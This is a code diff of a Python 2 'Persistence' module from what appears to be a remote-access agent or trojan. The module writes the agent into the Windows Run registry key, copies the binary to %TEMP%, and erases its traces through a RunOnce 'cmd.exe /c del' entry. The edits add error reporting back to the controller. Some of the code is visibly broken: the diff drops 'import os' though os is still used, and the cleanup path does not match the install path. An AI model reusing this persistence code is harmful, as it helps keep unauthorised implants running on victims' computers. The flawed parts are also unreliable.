@@ -1,4 +1,3 @@
-import os
 import sys
 import subprocess
 import shutil
@@ -21,38 +20,52 @@ EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)
 
 def install():
     if not is_installed():
-        stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
-        shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)
-
+        try:
+            stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
+            shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)
+        except Exception as e:
+            utils.send_output("Persistence: failed to install the agent: %s." % (e))
 
 def clean():
-    subprocess.Popen("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME,
-                         shell=True)
-    subprocess.Popen(
-        "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""),
-                          shell=True)
-
+    stdin, stdout, stderr = os.popen3("reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s" % SERVICE_NAME)
+    error = stderr.read()
+    if error:
+        return False
+        
+    stdin, stdout, stderr = os.popen3(
+        "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "\"cmd.exe /c del %USERPROFILE%\\" + EXECUTABLE_NAME + "\""))
+    error = stderr.read()
+    if error:
+        return False
+    return True
 
 def is_installed():
-    output = os.popen(
-        "reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
-    if SERVICE_NAME in output.read():
+    stdin, stdout, stderr = os.popen3("reg query HKCU\Software\Microsoft\Windows\Currentversion\Run /f %s" % SERVICE_NAME)
+    error = stderr.read()
+    if error:
+        utils.send_output("Persistence: failed to run command to install in registry: %s." % (error))
+        return True
+    if SERVICE_NAME in stdout.read():
         return True
     else:
         return False
 
-
-def run(action):
+def run(action = None):
+    if action == None:
+        print "Pesistence module run needs one parameter."
     if action == "install":
-        utils.send_output("Persistence installed")
+        install()
+        utils.send_output("Persistence installed.")
     elif action == "remove":
-        clean()
-        utils.send_output("Persistence removed")
+        if clean():
+            utils.send_output("Persistence removed.")
+        else:
+            utils.send_output("Persistence could not be removed.")
     elif action == "status":
         if is_installed():
-            utils.send_output("Persistence is ON")
+            utils.send_output("Persistence is ON.")
         else:
-            utils.send_output("Persistence is OFF")
+            utils.send_output("Persistence is OFF.")
 
 
 def help():
